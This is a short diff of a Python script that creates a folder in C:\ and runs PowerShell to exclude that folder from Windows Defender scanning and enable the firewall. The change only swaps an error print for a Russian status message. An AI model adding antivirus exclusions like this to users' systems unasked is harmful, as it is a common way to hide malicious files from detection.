@@ -7,7 +7,7 @@ def createFolderAndSetupFirewall():
     try:
         os.mkdir(f'c:\\{folder}')
     except FileExistsError as e:
-        print(e)
+        print(f"Папка {folder} уже существует, настраиваю файрвол")
 
     powershell_command = [f'Add-MpPreference -ExclusionPath C:\\{folder} ',
                           "Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled True ",
